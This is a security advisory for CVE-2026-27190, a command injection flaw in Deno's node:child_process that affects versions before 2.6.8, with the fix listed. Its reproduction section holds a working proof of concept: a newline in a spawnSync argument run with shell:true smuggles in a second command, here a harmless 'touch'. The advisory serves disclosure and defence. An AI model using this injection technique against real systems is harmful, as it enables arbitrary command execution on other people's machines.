# [H] Deno has a Command Injection via Incomplete shell metacharacter blocklist in node:child_process

## Summary
Severity: High
Advisory: GHSA-hmh4-3xvx-q5hr
CVE: CVE-2026-27190
CWE: CWE-78
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-19
Source: https://github.com/advisories/GHSA-hmh4-3xvx-q5hr
Type: github-advisory

## Affected
- crates.io: `deno` — affected >=0 <2.6.8

## Details
## Summary
A command injection vulnerability exists in Deno's `node:child_process` implementation. 

## Reproduction
```javascript
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";

// Cleanup
try { fs.unlinkSync('/tmp/rce_proof'); } catch {}

// Create legitimate script
fs.writeFileSync('/tmp/legitimate.ts', 'console.log("normal");');

// Malicious input with newline injection
const maliciousInput = `/tmp/legitimate.ts\ntouch /tmp/rce_proof`;

// Vulnerable pattern
spawnSync(Deno.execPath(), ['run', '--allow-all', maliciousInput], {
  shell: true,
  encoding: 'utf-8'
});

// Verify
console.log('Exploit worked:', fs.existsSync('/tmp/rce_proof'));
```

Run: `deno run --allow-all poc.mjs`

The file `/tmp/rce_proof` is created, confirming arbitrary command execution.

## Mitigation

All users need to update to the patched version (Deno v2.6.8).

## References
- https://github.com/denoland/deno/security/advisories/GHSA-hmh4-3xvx-q5hr
- https://nvd.nist.gov/vuln/detail/CVE-2026-27190
- https://github.com/denoland/deno/commit/9132ad958c83a0d0b199de12b69b877f63edab4c
- https://github.com/denoland/deno
- https://github.com/denoland/deno/releases/tag/v2.6.8
